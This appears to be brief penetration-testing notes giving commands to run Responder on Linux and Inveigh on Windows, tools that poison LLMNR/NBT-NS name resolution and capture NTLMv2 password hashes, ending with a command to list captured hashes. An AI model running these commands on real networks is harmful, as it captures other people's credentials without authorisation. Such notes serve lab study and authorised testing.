responder for linux

```shell
sudo responder -I ens224
```

responder for windows

```powershell
Import-Module .\Inveigh.ps1
```
```powershell
(Get-Command Invoke-Inveigh).Parameters
```
```powershell
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

responder as an application for windows

```powershell
.\Inveigh.exe
```
```powershell
GET NTLMV2UNIQUE
```
